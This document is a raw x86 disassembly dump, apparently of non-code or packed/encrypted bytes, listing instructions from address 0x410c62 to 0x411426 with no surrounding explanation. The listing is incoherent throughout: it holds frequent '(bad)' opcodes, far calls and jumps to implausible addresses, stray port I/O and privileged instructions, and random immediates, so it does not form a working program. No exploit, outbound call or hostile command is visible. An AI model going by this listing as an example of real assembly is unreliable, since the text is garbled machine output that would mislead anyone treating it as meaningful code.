  410c62:	call   0x68ad:0x42407a61
  410c69:	sub    eax,DWORD PTR [edx]
  410c6b:	sub    dh,0x43
  410c6e:	adc    DWORD PTR [ebx+ebx*1+0x4b],ebp
  410c72:	retf   
  410c73:	cmp    al,0xc0
  410c75:	aam    0x7
  410c77:	or     DWORD PTR [ecx-0x4a45d3da],ebx
  410c7d:	sub    eax,0x152e46c
  410c82:	scas   eax,DWORD PTR es:[edi]
  410c83:	xor    eax,0x5a04e22c
  410c88:	pop    ss
  410c89:	fisubr DWORD PTR [ebp+0x3e9c9c09]
  410c8f:	stc    
  410c90:	jg     0x410c84
  410c92:	or     eax,0xbb6d8612
  410c97:	xor    eax,0x9b71b750
  410c9c:	mov    al,BYTE PTR [ebx+0x1a]
  410c9f:	jne    0x410d1b
  410ca1:	fstp   TBYTE PTR [edx+0x76d16e82]
  410ca7:	shr    DWORD PTR [edx+0x4a],cl
  410caa:	xor    DWORD PTR [ebx+0x32],0xffffffe0
  410cae:	(bad)  
  410caf:	push   esp
  410cb0:	jno    0x410cb0
  410cb2:	frstor [esi+0x55d5b364]
  410cb8:	aad    0x15
  410cba:	mov    al,0x2b
  410cbc:	fmul   DWORD PTR [ecx+ebx*8+0x60]
  410cc0:	fldcw  WORD PTR [esi-0x25]
  410cc3:	push   edx
  410cc4:	mov    ebx,0x893c5f2e
  410cc9:	mov    eax,ds:0x6e0c772b
  410cce:	xchg   BYTE PTR [ecx-0x5a],dh
  410cd1:	jmp    0x9b00:0x41f297f2
  410cd8:	adc    DWORD PTR [eax],eax
  410cda:	addr16 xchg ecx,eax
  410cdc:	stos   DWORD PTR es:[edi],eax
  410cdd:	push   esp
  410cde:	pusha  
  410cdf:	mov    ebx,0x5171d075
  410ce4:	aaa    
  410ce5:	push   esp
  410ce6:	inc    esp
  410ce7:	adc    bl,BYTE PTR [esi-0x47]
  410cea:	scas   al,BYTE PTR es:[edi]
  410ceb:	adc    BYTE PTR [eax+0x6b],dh
  410cee:	or     ah,dl
  410cf0:	(bad)  
  410cf1:	dec    ebp
  410cf2:	mov    al,0x43
  410cf4:	and    BYTE PTR cs:[eax+0x75],ch
  410cf8:	pop    edx
  410cf9:	mov    edx,0xea9c3d
  410cfe:	fisubr DWORD PTR [esi+0x20]
  410d01:	push   0xfffffffe
  410d03:	pop    ss
  410d04:	cdq    
  410d05:	and    BYTE PTR [esi+0x4d],0xc5
  410d09:	ins    DWORD PTR es:[edi],dx
  410d0a:	pop    ebx
  410d0b:	cmp    al,bl
  410d0d:	cmp    BYTE PTR [ebx+0x3755d080],cl
  410d13:	les    ebp,FWORD PTR [eax]
  410d15:	adc    eax,0x36ba02e5
  410d1a:	scas   al,BYTE PTR es:[edi]
  410d1b:	rcl    DWORD PTR [ecx-0x45],cl
  410d1e:	lock pop ebp
  410d20:	jo     0x410d78
  410d22:	mov    ecx,0xb510d065
  410d27:	pushf  
  410d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d29:	jbe    0x410d40
  410d2b:	fmul   QWORD PTR [edx-0x47]
  410d2e:	mov    DWORD PTR [edi+eiz*2],ecx
  410d31:	inc    ebx
  410d32:	or     BYTE PTR [ebp-0x291f7c53],dh
  410d38:	cmp    edi,DWORD PTR [edx+0x39]
  410d3b:	mov    ebx,0xdb02deb
  410d40:	rol    dl,1
  410d42:	lea    ecx,[edi]
  410d44:	jle    0x410d6d
  410d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d47:	push   0xfffffffc
  410d49:	sbb    eax,0x512a5c44
  410d4e:	mov    ah,0xf3
  410d50:	imul   edi,DWORD PTR [eax],0x62
  410d53:	push   0x6d0b1b6b
  410d58:	adc    edi,DWORD PTR [edi-0x599d3a2a]
  410d5e:	nop
  410d5f:	cld    
  410d60:	ret    0xd6db
  410d63:	ret    0x302
  410d66:	test   BYTE PTR [ecx+0x34],0x19
  410d6a:	xchg   ebp,eax
  410d6b:	add    ah,BYTE PTR [ebx-0x24]
  410d6e:	fisubr DWORD PTR [esi]
  410d70:	stos   BYTE PTR es:[edi],al
  410d71:	cmp    eax,0xb04bcea4
  410d76:	xchg   bh,ah
  410d78:	cmp    ah,BYTE PTR [edx]
  410d7a:	pop    edx
  410d7b:	inc    eax
  410d7c:	pmulhuw mm1,mm5
  410d7f:	mov    esp,0xd0b0b822
  410d84:	icebp  
  410d85:	jl     0x410d5a
  410d87:	test   eax,0x6a5d34ac
  410d8c:	aaa    
  410d8d:	sbb    cl,BYTE PTR ds:0x60132188
  410d93:	cmp    cl,ch
  410d95:	mov    gs,WORD PTR [ecx+0x50]
  410d98:	fcmovnbe st,st(6)
  410d9a:	inc    esp
  410d9b:	fs (bad) 
  410d9d:	outs   dx,BYTE PTR ds:[esi]
  410d9e:	sbb    eax,DWORD PTR [edi+0x5f]
  410da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410da2:	lods   eax,DWORD PTR ds:[esi]
  410da3:	mov    ch,0xb0
  410da5:	ror    ebp,cl
  410da7:	int    0xc6
  410da9:	test   eax,0x4922e32
  410dae:	aad    0x96
  410db0:	mov    al,ds:0xb0267b9c
  410db5:	pop    ss
  410db6:	fimul  DWORD PTR [ebp+0x1298e3ad]
  410dbc:	adc    eax,0x7c08cbc1
  410dc1:	adc    al,0x15
  410dc3:	dec    ebx
  410dc4:	adc    DWORD PTR [ebx],ebx
  410dc6:	in     eax,0x0
  410dc8:	mov    ds:0x2d4ce4db,eax
  410dcd:	pop    ecx
  410dce:	stos   BYTE PTR es:[edi],al
  410dcf:	lods   eax,DWORD PTR ds:[esi]
  410dd0:	leave  
  410dd1:	inc    eax
  410dd2:	add    eax,0x2808105c
  410dd7:	ins    DWORD PTR es:[edi],dx
  410dd8:	sub    al,0xb4
  410dda:	sub    eax,0x5bad939b
  410ddf:	push   esp
  410de0:	or     edx,ebp
  410de2:	push   ss
  410de3:	mov    dh,0x42
  410de5:	stos   DWORD PTR es:[edi],eax
  410de6:	xor    ebp,0xffffffd9
  410de9:	retf   
  410dea:	jb     0x410dfc
  410dec:	int3   
  410ded:	pop    ebx
  410dee:	stos   DWORD PTR es:[edi],eax
  410def:	push   0xf7013117
  410df4:	cmp    bh,0xb3
  410df7:	pop    es
  410df8:	inc    esi
  410df9:	inc    ebx
  410dfa:	push   cs
  410dfb:	xor    ch,0x28
  410dfe:	sbb    DWORD PTR [edi-0x34],0x43
  410e02:	mov    al,0x8b
  410e04:	call   0xc01fffed
  410e09:	fidiv  WORD PTR ds:0x2025b768
  410e0f:	jnp    0x410e1a
  410e11:	pop    edi
  410e12:	(bad)  
  410e13:	rol    BYTE PTR ds:0xd85858a8,cl
  410e19:	xchg   DWORD PTR ds:0xb27f2c13,edi
  410e1f:	or     dl,BYTE PTR [edi-0x7a552555]
  410e25:	dec    BYTE PTR [edx+edx*2+0x53]
  410e29:	les    esp,FWORD PTR [ebp-0x3f69416f]
  410e2f:	loope  0x410dbd
  410e31:	adc    eax,0xdbdb6c2e
  410e36:	jge    0x410e2e
  410e38:	ret    0xd6a3
  410e3b:	lds    ebx,FWORD PTR [edi+0x40]
  410e3e:	mov    ah,0xc1
  410e40:	mov    dh,0x2d
  410e42:	jge    0x410e30
  410e44:	add    eax,0x8322a796
  410e49:	retf   
  410e4a:	push   eax
  410e4b:	mov    al,ds:0x4e0e35b6
  410e50:	and    BYTE PTR [edx-0x47],ah
  410e53:	fnsave [esi+ebp*2]
  410e56:	sub    eax,0x84de37b0
  410e5b:	call   0xc9d60997
  410e60:	mov    bh,0x6
  410e62:	or     BYTE PTR [esi],ch
  410e64:	(bad)  
  410e65:	or     BYTE PTR [edi+ebp*1+0x70d735bc],dl
  410e6c:	outs   dx,BYTE PTR ds:[esi]
  410e6d:	sbb    esp,ebp
  410e6f:	or     eax,DWORD PTR [edi]
  410e71:	iret   
  410e72:	add    BYTE PTR [ecx-0x3dbe90ae],dh
  410e78:	xor    al,0xa
  410e7a:	xchg   esi,eax
  410e7b:	call   0x8862:0xb59edb68
  410e82:	stc    
  410e83:	aas    
  410e84:	jecxz  0x410ea5
  410e86:	xchg   esi,eax
  410e87:	test   al,0x5a
  410e89:	aaa    
  410e8a:	or     al,0x83
  410e8c:	xor    eax,0x5f469f1f
  410e91:	pop    ebp
  410e92:	push   0x8
  410e94:	sub    DWORD PTR [eax-0x7a],esi
  410e97:	out    0x49,eax
  410e99:	or     BYTE PTR ds:[ebx],ch
  410e9c:	ins    BYTE PTR es:[edi],dx
  410e9d:	sub    BYTE PTR [esi-0xc7fd9dd],dh
  410ea3:	stc    
  410ea4:	jge    0x410efe
  410ea6:	sahf   
  410ea7:	cmp    dh,BYTE PTR [ecx-0x77]
  410eaa:	ins    DWORD PTR es:[edi],dx
  410eab:	das    
  410eac:	pop    ss
  410ead:	jbe    0x410e64
  410eaf:	leave  
  410eb0:	xchg   ebx,eax
  410eb1:	fisttp WORD PTR [ebp-0x62d4968a]
  410eb7:	fstp   DWORD PTR [edi-0x4c]
  410eba:	into   
  410ebb:	rol    DWORD PTR [edx+edi*4+0x61b71535],1
  410ec2:	mov    al,0x96
  410ec4:	or     ah,BYTE PTR ds:[edx+ecx*2+0x6cade2a9]
  410ecc:	mov    cl,0xb
  410ece:	add    bl,BYTE PTR [eax-0x49a04b4b]
  410ed4:	aas    
  410ed5:	pop    edx
  410ed6:	stos   BYTE PTR es:[edi],al
  410ed7:	test   DWORD PTR [ebx+eax*2],eax
  410eda:	sahf   
  410edb:	mov    WORD PTR [edx],?
  410edd:	test   eax,0x50b48f39
  410ee2:	pop    ss
  410ee3:	add    DWORD PTR [edi-0xb],esp
  410ee6:	cwde   
  410ee7:	ins    BYTE PTR es:[edi],dx
  410ee8:	cs sub ch,0xb6
  410eec:	lods   eax,DWORD PTR ds:[esi]
  410eed:	and    esi,DWORD PTR [esi+0x55478710]
  410ef3:	sub    esp,DWORD PTR [ebp+0x5ddb6c6a]
  410ef9:	push   eax
  410efa:	sbb    eax,0x3c071aa1
  410eff:	jp     0x410f38
  410f01:	sbb    cl,BYTE PTR [eax-0x5c675892]
  410f07:	ret    
  410f08:	pop    ebp
  410f09:	nop
  410f0a:	pushf  
  410f0b:	sub    DWORD PTR [ebp+0x2],ebp
  410f0e:	call   0xd070:0xfd886568
  410f15:	cmp    al,BYTE PTR [ebp+0x47]
  410f18:	jno    0x410ec5
  410f1a:	ficom  DWORD PTR [edx+0x69]
  410f1d:	shl    dl,1
  410f1f:	pop    esi
  410f20:	dec    ebp
  410f21:	adc    al,0xb7
  410f23:	push   esi
  410f24:	dec    ebx
  410f25:	ds cmp eax,0xd37efc5
  410f2b:	inc    ebp
  410f2c:	dec    ebx
  410f2d:	push   esp
  410f2e:	(bad)  
  410f2f:	fcom   QWORD PTR [ebp+0x6ed4b63d]
  410f35:	mov    ch,0x85
  410f37:	cmc    
  410f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f39:	jno    0x410f6c
  410f3b:	outs   dx,BYTE PTR ds:[esi]
  410f3c:	frstor [edx+0x62]
  410f3f:	add    DWORD PTR [ebx],ecx
  410f41:	sbb    ebx,ebx
  410f43:	fisttp QWORD PTR [ecx-0x1754a820]
  410f49:	adc    DWORD PTR [eax],0x96b5575b
  410f4f:	ror    DWORD PTR [edx+0x59],1
  410f52:	adc    DWORD PTR [eax+0x5c],ebx
  410f55:	ficom  DWORD PTR [esi-0x21c61e6]
  410f5b:	sbb    DWORD PTR [esi],0x56
  410f5e:	xchg   edi,eax
  410f5f:	xchg   DWORD PTR [ebp+0x43107540],ebp
  410f65:	inc    eax
  410f66:	jne    0x410fc4
  410f68:	inc    esp
  410f69:	fcom   QWORD PTR [esi+0x29ddc4ca]
  410f6f:	repnz add eax,0x6eaa9967
  410f75:	xchg   ebp,eax
  410f76:	jbe    0x410fe8
  410f78:	push   esp
  410f79:	aas    
  410f7a:	fnstsw WORD PTR [edi+0x46]
  410f7d:	push   ss
  410f7e:	je     0x410fdb
  410f80:	fcomp  DWORD PTR [edx+0x585cdc56]
  410f86:	popf   
  410f87:	ror    bl,cl
  410f89:	jg     0x410ff3
  410f8b:	mov    cl,0xb0
  410f8d:	aam    0x15
  410f8f:	and    eax,0x3abc7a9e
  410f94:	out    dx,al
  410f95:	mov    al,0xb5
  410f97:	mov    cl,0xb4
  410f99:	rep outs dx,DWORD PTR ds:[esi]
  410f9b:	or     BYTE PTR [ebx-0x48cb8b13],0xb6
  410fa2:	int    0x54
  410fa4:	mov    edx,0x20828d10
  410fa9:	pop    ss
  410faa:	repnz xchg ebx,eax
  410fac:	jge    0x411017
  410fae:	pop    esp
  410faf:	jb     0x410f81
  410fb1:	add    dh,bl
  410fb3:	inc    ecx
  410fb4:	out    dx,eax
  410fb5:	pop    edi
  410fb6:	jno    0x410fcd
  410fb8:	ins    BYTE PTR es:[edi],dx
  410fb9:	lods   eax,DWORD PTR ds:[esi]
  410fba:	cmovle ecx,DWORD PTR [ebp+0x67b0d9e5]
  410fc1:	mov    dh,0x35
  410fc3:	push   ebp
  410fc4:	sub    al,0x5c
  410fc6:	mov    al,ds:0xbf298fcd
  410fcb:	xor    eax,0xedb52e14
  410fd0:	and    al,bh
  410fd2:	into   
  410fd3:	inc    edx
  410fd4:	mov    dh,0x32
  410fd6:	mov    esi,0xa6aa39b
  410fdb:	outs   dx,BYTE PTR ds:[esi]
  410fdc:	sub    al,0x82
  410fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fdf:	or     DWORD PTR [esi],esp
  410fe1:	int3   
  410fe2:	mov    ch,BYTE PTR [ecx+0x40]
  410fe5:	fwait
  410fe6:	pusha  
  410fe7:	or     DWORD PTR [edi+0xf3c3ed6],esi
  410fed:	cld    
  410fee:	test   DWORD PTR [ebx],ebx
  410ff0:	sbb    eax,0x419606e2
  410ff5:	push   cs
  410ff6:	(bad)  
  410ff8:	add    dh,ah
  410ffa:	sub    BYTE PTR [eax],al
  410ffc:	jnp    0x41101a
  410ffe:	aam    0xd6
  411000:	mov    al,0x87
  411002:	inc    esi
  411003:	out    0x53,eax
  411005:	lahf   
  411006:	sub    al,0x84
  411008:	fist   DWORD PTR [esi]
  41100a:	sub    al,BYTE PTR [edx-0x2b]
  41100d:	xlat   BYTE PTR ds:[ebx]
  41100e:	sub    bh,BYTE PTR [eax]
  411010:	je     0x41107d
  411012:	mov    bh,0x46
  411014:	mov    ebx,DWORD PTR [ecx-0x2c]
  411017:	mov    cl,0xc8
  411019:	(bad)  
  41101a:	out    dx,al
  41101b:	fisub  DWORD PTR [eax]
  41101d:	fadd   DWORD PTR [ecx-0x4c]
  411020:	cmp    BYTE PTR [edx-0x5c],ah
  411023:	mov    ebx,0x11760acc
  411028:	ins    BYTE PTR es:[edi],dx
  411029:	enter  0x2bcf,0xd7
  41102d:	and    al,0x1d
  41102f:	push   edx
  411030:	push   edi
  411031:	aad    0x86
  411033:	fst    st(4)
  411035:	jge    0x410fd7
  411037:	xor    DWORD PTR [eax-0x17449396],esi
  41103d:	push   0xc60c62d9
  411042:	into   
  411043:	and    DWORD PTR [eax+0x6d],edi
  411046:	or     ebx,DWORD PTR [ebx+0x29]
  411049:	xchg   ebp,eax
  41104a:	push   0x65483421
  41104f:	mov    al,0x2c
  411051:	adc    BYTE PTR [ebp+0x7bf8d40b],dh
  411057:	lods   eax,DWORD PTR ds:[esi]
  411058:	fsubr  DWORD PTR [eax+0x2b568a3a]
  41105e:	popf   
  41105f:	cmp    esi,DWORD PTR [ecx+0x2f]
  411062:	retf   0xb820
  411065:	push   eax
  411066:	mov    bl,ch
  411068:	mov    esi,0x144dfedc
  41106d:	pop    ss
  41106e:	mov    edx,0x903d9b0b
  411073:	pop    edx
  411074:	mov    WORD PTR [edi+0x6c51b6da],?
  41107a:	jmp    0xe6db9083
  41107f:	jmp    0x57432849
  411084:	fst    QWORD PTR [ecx]
  411086:	sahf   
  411087:	sub    BYTE PTR ds:[eax],bl
  41108a:	mov    al,0x69
  41108c:	lds    esi,FWORD PTR [esi+0x69]
  41108f:	imul   ecx,DWORD PTR [ecx-0x3b5b3dec],0xffffffb2
  411096:	lds    ebp,FWORD PTR [ebx]
  411098:	push   es
  411099:	or     BYTE PTR [ebx],0x1d
  41109c:	pop    esp
  41109d:	push   ecx
  41109e:	mov    dl,0xae
  4110a0:	popa   
  4110a1:	repnz push edx
  4110a3:	fild   DWORD PTR [eax]
  4110a5:	(bad)  
  4110a7:	not    BYTE PTR [ebp+0x1a40e5d4]
  4110ad:	cwde   
  4110ae:	fwait
  4110af:	adc    ebp,ebx
  4110b1:	sub    ch,dl
  4110b3:	jb     0x41103e
  4110b5:	or     al,0x74
  4110b7:	imul   ebx,eax,0x6a
  4110ba:	add    BYTE PTR ds:0xdee8de5,dh
  4110c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c1:	add    BYTE PTR [esi+0x55],dh
  4110c4:	fdiv   QWORD PTR [eax]
  4110c6:	into   
  4110c7:	f2xm1  
  4110c9:	cld    
  4110ca:	sub    DWORD PTR [ebx+0x4d],ebx
  4110cd:	add    esp,ebp
  4110cf:	imul   eax,ebx,0xffffffc8
  4110d2:	imul   edi,ebx,0x605cb7cd
  4110d8:	imul   esp,DWORD PTR [eax+0x4d864737],0x4c
  4110df:	aad    0xb6
  4110e1:	pop    ecx
  4110e2:	retf   
  4110e3:	test   DWORD PTR [esi-0x21ffd341],edx
  4110e9:	cli    
  4110ea:	add    bh,ch
  4110ec:	cmp    eax,0xdbcc7d02
  4110f1:	push   0xffffffbb
  4110f3:	xor    eax,0x3bfb0e40
  4110f8:	jo     0x4110cd
  4110fa:	loopne 0x411178
  4110fc:	mov    ch,0xb
  4110fe:	or     eax,0x1cd057a6
  411103:	push   ebp
  411104:	xchg   esp,eax
  411105:	xor    BYTE PTR [edi],dl
  411107:	inc    esi
  411108:	mov    ch,0xd4
  41110a:	outs   dx,BYTE PTR ds:[esi]
  41110b:	adc    BYTE PTR [ecx-0x38e85516],ch
  411111:	call   0xdb1ebedd
  411116:	stos   BYTE PTR es:[edi],al
  411117:	push   0xe0c33c98
  41111c:	dec    ebp
  41111d:	adc    al,0xf4
  41111f:	imul   BYTE PTR [esi]
  411121:	call   0x59b0ec2c
  411126:	sahf   
  411127:	out    dx,eax
  411128:	xor    cl,BYTE PTR ds:[ecx-0x727a7a26]
  41112f:	icebp  
  411130:	inc    edx
  411131:	push   cs
  411132:	add    DWORD PTR ds:0xb955e97,edx
  411138:	push   ebp
  411139:	xor    al,0x41
  41113b:	fmul   QWORD PTR [eax]
  41113d:	out    0xb7,al
  41113f:	inc    esi
  411140:	sbb    eax,0x6db6858d
  411145:	pop    edx
  411146:	jbe    0x411146
  411148:	mov    ebp,0x57915235
  41114d:	je     0x4111ba
  41114f:	mov    bh,0xa5
  411151:	jmp    0x4110fa
  411153:	xchg   ebx,eax
  411154:	dec    ebp
  411155:	mov    bl,0xa4
  411157:	clc    
  411158:	mov    DWORD PTR [ebx],eax
  41115a:	add    DWORD PTR [ebp+0x50],eax
  41115d:	fadd   DWORD PTR [ecx-0x2]
  411160:	or     al,0xb
  411162:	ins    DWORD PTR es:[edi],dx
  411163:	push   edi
  411164:	rol    edx,0xb6
  411167:	cmc    
  411168:	jb     0x4110ff
  41116a:	les    esp,FWORD PTR [ecx-0x5b]
  41116d:	mov    dl,0x11
  41116f:	pop    ss
  411170:	or     al,BYTE PTR [ebx+ecx*2+0x7]
  411174:	xor    al,0x4f
  411176:	(bad)  [ebx]
  411178:	fcmovnb st,st(6)
  41117a:	(bad)  
  41117b:	inc    esp
  41117c:	sbb    DWORD PTR ds:0x5d027b6,0x828ea2
  411186:	mov    eax,0x2be66ed1
  41118b:	out    dx,al
  41118c:	pop    ecx
  41118d:	out    0x76,eax
  41118f:	sbb    bh,BYTE PTR [edx-0x5413a04b]
  411195:	(bad)  
  411196:	dec    ebp
  411197:	push   ds
  411198:	cli    
  411199:	and    dl,BYTE PTR [eax*1-0x49e91ade]
  4111a0:	xchg   BYTE PTR [edx],ah
  4111a2:	or     ebx,ebp
  4111a4:	mov    DWORD PTR [edx+0x2c2d3279],ebx
  4111aa:	cmp    eax,ebx
  4111ac:	cmp    al,0xec
  4111af:	jge    0x4111f1
  4111b1:	or     BYTE PTR cs:0xc5b1b06c,ch
  4111b8:	iret   
  4111b9:	xchg   ebx,eax
  4111ba:	imul   BYTE PTR [ebp-0x151692db]
  4111c0:	add    BYTE PTR [edx+0x58aabcb0],bh
  4111c6:	repnz xor al,0xf7
  4111c9:	jae    0x4111eb
  4111cb:	fcomp  DWORD PTR [eax-0x60]
  4111ce:	inc    esp
  4111cf:	cmp    esp,ecx
  4111d1:	sahf   
  4111d2:	dec    ebp
  4111d3:	inc    ecx
  4111d4:	xchg   edi,eax
  4111d5:	cmp    cl,BYTE PTR [edx]
  4111d7:	and    al,0x8c
  4111d9:	pop    esp
  4111da:	xlat   BYTE PTR ds:[ebx]
  4111db:	adc    al,0xed
  4111dd:	ins    DWORD PTR es:[edi],dx
  4111de:	popa   
  4111df:	mov    ds:0x411e8f54,eax
  4111e4:	sbb    DWORD PTR [ebp+0x742ed26],ebx
  4111ea:	shr    DWORD PTR [eax-0xbfd1983],1
  4111f0:	ja     0x4111bb
  4111f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111f3:	(bad)  
  4111f4:	push   eax
  4111f5:	or     edx,DWORD PTR [ebp+0x31]
  4111f8:	push   ebx
  4111f9:	jae    0x411264
  4111fb:	sub    al,0x44
  4111fd:	aam    0xba
  4111ff:	shl    eax,0xaa
  411202:	push   eax
  411203:	xchg   ecx,eax
  411204:	sbb    al,0xb5
  411206:	sub    eax,0xc6d84f6c
  41120b:	lds    esi,FWORD PTR [edx-0x52c1d330]
  411211:	fisttp DWORD PTR [edx+0x44]
  411214:	mov    ebx,0x62e87cd0
  411219:	mov    ecx,0x88591841
  41121e:	lea    ebp,[ebp+0x63]
  411221:	or     al,0xff
  411223:	jns    0x411227
  411225:	add    DWORD PTR [esi+edi*1],esp
  411228:	pop    ebp
  411229:	adc    al,0x1d
  41122b:	mov    ch,0xa3
  41122d:	retf   0x6184
  411230:	sub    al,0xa0
  411233:	mov    dh,0xad
  411235:	jle    0x411259
  411237:	sti    
  411238:	enter  0x147a,0xb4
  41123c:	(bad)  
  41123d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41123e:	jbe    0x41129b
  411240:	cmp    cl,al
  411242:	or     eax,DWORD PTR [ebx+0x6c983b66]
  411248:	and    al,0x87
  41124a:	sbb    esi,esp
  41124c:	rcl    dl,1
  41124e:	dec    edx
  41124f:	pop    esp
  411250:	js     0x4111e4
  411252:	sbb    BYTE PTR [ebx+0x36],0xd2
  411256:	mov    dh,0xd4
  411258:	inc    ecx
  411259:	jl     0x411298
  41125b:	cmp    edi,ebp
  41125d:	out    0xb5,al
  41125f:	enter  0x7001,0x79
  411263:	jmp    0x692a452a
  411268:	add    BYTE PTR [edi],dl
  41126a:	xchg   edx,eax
  41126b:	add    al,0x52
  41126d:	mov    ch,0x45
  41126f:	fcmovne st,st(1)
  411271:	push   edi
  411272:	pop    es
  411273:	lods   eax,DWORD PTR ds:[esi]
  411274:	push   bx
  411276:	push   ecx
  411277:	imul   esp,DWORD PTR [ebx-0x5a704923],0xffffffbf
  41127e:	gs xchg ebx,eax
  411280:	ret    0x16ba
  411283:	ins    DWORD PTR es:[edi],dx
  411284:	sub    DWORD PTR [eax-0x7f],0x6d
  411288:	and    BYTE PTR [ebx],cl
  41128a:	mov    cl,0x45
  41128c:	adc    esi,DWORD PTR [ebx+0x6daa06aa]
  411292:	mov    ds:0x2f08306b,al
  411297:	inc    esi
  411298:	pop    ecx
  411299:	loop   0x4112f1
  41129b:	xor    DWORD PTR [esi+0x14700a1b],0x15
  4112a2:	pop    ss
  4112a3:	lds    edx,FWORD PTR [esi-0x3b]
  4112a6:	mov    bh,0x0
  4112a8:	pushf  
  4112a9:	push   0x76
  4112ab:	test   eax,0xb33e6a23
  4112b0:	or     edx,DWORD PTR [eax+esi*4+0x62]
  4112b4:	std    
  4112b5:	das    
  4112b6:	mov    eax,ds:0x77b696dd
  4112bb:	(bad)  
  4112bc:	(bad)  
  4112be:	rcr    edi,1
  4112c0:	mov    ecx,0x96df01e3
  4112c5:	lods   eax,DWORD PTR ds:[esi]
  4112c6:	je     0x4112cc
  4112c8:	daa    
  4112c9:	sti    
  4112ca:	out    0x6,al
  4112cc:	je     0x4112d0
  4112ce:	neg    DWORD PTR [esi-0x525a8800]
  4112d4:	and    DWORD PTR [esi],ebp
  4112d6:	jp     0x411346
  4112d8:	dec    eax
  4112d9:	pop    eax
  4112da:	lods   eax,DWORD PTR ds:[esi]
  4112db:	pusha  
  4112dc:	xchg   BYTE PTR [edi+esi*4-0x7b],al
  4112e0:	(bad)  
  4112e1:	(bad)
  4112e4:	mov    al,ds:0xedcfe38f
  4112e9:	ins    DWORD PTR es:[edi],dx
  4112ea:	imul   eax,DWORD PTR [eax+0x4fad4036],0x65
  4112f1:	scas   eax,DWORD PTR es:[edi]
  4112f2:	mov    al,0x1d
  4112f4:	fld    QWORD PTR [eax+0x6d]
  4112f7:	fild   DWORD PTR [ebp-0x5b1d2f97]
  4112fd:	ret    0xaa5a
  411300:	push   eax
  411301:	mov    ds:0xbb361404,eax
  411306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411307:	adc    DWORD PTR [esi+0x13],ebx
  41130a:	int3   
  41130b:	or     ebp,DWORD PTR [ebp+0x2d]
  41130e:	push   0xba9e11c7
  411313:	mov    al,0x36
  411315:	dec    ebx
  411316:	adc    BYTE PTR [edi-0x7e107992],ah
  41131c:	and    edi,eax
  41131e:	fdiv   DWORD PTR [eax+0x1cb52e8b]
  411324:	fisubr DWORD PTR [esp+eiz*8]
  411327:	mov    ds:0xe27298f2,eax
  41132c:	mov    dh,0x75
  41132e:	push   ebp
  41132f:	pop    DWORD PTR [esi+0x3e]
  411332:	out    0x20,eax
  411334:	dec    esi
  411335:	inc    BYTE PTR [edx-0x476569fb]
  41133b:	mov    ebx,0xa3d8e63b
  411340:	mov    eax,0x640da56d
  411345:	push   ecx
  411346:	push   esi
  411347:	jp     0x41139f
  411349:	adc    DWORD PTR [edx-0x57992d4a],0x9
  411350:	inc    esi
  411351:	sbb    DWORD PTR ds:0x2749617,0x45c0ba5a
  41135b:	in     eax,dx
  41135c:	repz add edx,DWORD PTR [edx+0x4e]
  411360:	fsub   DWORD PTR [eax+0x2f4aeb70]
  411366:	out    0x12,al
  411368:	dec    esp
  411369:	xchg   ecx,eax
  41136a:	xchg   edx,eax
  41136b:	(bad)  
  41136d:	mov    dh,0xd0
  41136f:	add    BYTE PTR [ecx-0x2a5eac87],0x8c
  411376:	pop    ss
  411377:	lods   eax,DWORD PTR ds:[esi]
  411378:	dec    ebx
  411379:	sbb    ecx,DWORD PTR [ebx-0x32]
  41137c:	or     al,BYTE PTR [eax]
  41137e:	inc    esp
  41137f:	imul   edi,DWORD PTR [ebp+0x2a5bfa13],0x6c
  411386:	inc    eax
  411387:	jg     0x4113dd
  411389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41138a:	cmc    
  41138b:	pop    edx
  41138c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41138d:	sub    esp,DWORD PTR [edx-0x55]
  411390:	pusha  
  411391:	xor    ebx,edi
  411393:	ds pop esp
  411395:	mov    al,0xdd
  411397:	pusha  
  411398:	test   eax,0xd78c4d9c
  41139d:	push   ebp
  41139e:	test   DWORD PTR [eax+0x76d6ed32],eax
  4113a4:	add    al,0x1
  4113a6:	out    dx,al
  4113a7:	sbb    cl,BYTE PTR cs:[eax]
  4113aa:	mov    ch,0x4a
  4113ac:	ret    0x2edb
  4113af:	xchg   ebp,eax
  4113b0:	lods   eax,DWORD PTR ds:[esi]
  4113b1:	mov    dh,0x9d
  4113b3:	push   esp
  4113b4:	das    
  4113b5:	xchg   esp,eax
  4113b6:	pop    ebx
  4113b7:	mov    ecx,0x6c171b8
  4113bc:	loop   0x411400
  4113be:	cli    
  4113bf:	mov    dl,0x8f
  4113c1:	push   edx
  4113c2:	mov    ebp,0x5b6c6d56
  4113c7:	pop    es
  4113c8:	xchg   ecx,eax
  4113c9:	cmp    al,0x35
  4113cb:	rol    DWORD PTR [esi-0x2926036e],1
  4113d1:	sbb    cl,BYTE PTR [edx]
  4113d3:	test   al,0xb6
  4113d5:	dec    ebp
  4113d6:	bound  edx,QWORD PTR [ebp-0x4b9127b0]
  4113dc:	in     eax,dx
  4113dd:	es (bad) 
  4113df:	enter  0x3ec7,0x9f
  4113e3:	(bad)  
  4113e4:	cmp    ebp,eax
  4113e6:	mov    dl,0x76
  4113e8:	pop    ebx
  4113e9:	call   0xb2b4a218
  4113ee:	cmp    BYTE PTR [ebp+0x1a],bh
  4113f1:	or     DWORD PTR [edi],ebx
  4113f3:	pop    ebp
  4113f4:	ficomp DWORD PTR [edx]
  4113f6:	mov    bh,0x29
  4113f8:	int3   
  4113f9:	mov    esi,0x86255027
  4113fe:	sub    al,0xc6
  411400:	mov    eax,ds:0x86a02575
  411405:	pop    eax
  411406:	inc    esp
  411407:	int    0x89
  411409:	dec    ecx
  41140a:	sbb    eax,0x27685d5
  41140f:	cli    
  411410:	clc    
  411411:	and    bh,BYTE PTR [ebp+0x1d]
  411414:	mov    BYTE PTR [esi],dh
  411416:	fcomp  DWORD PTR [edx-0x60]
  411419:	adc    al,0x55
  41141b:	shr    BYTE PTR ds:0xc0bba2a6,0xc6
  411422:	out    0xf0,al
  411424:	adc    DWORD PTR [ebx],ecx
  411426:	jne    0x41148e
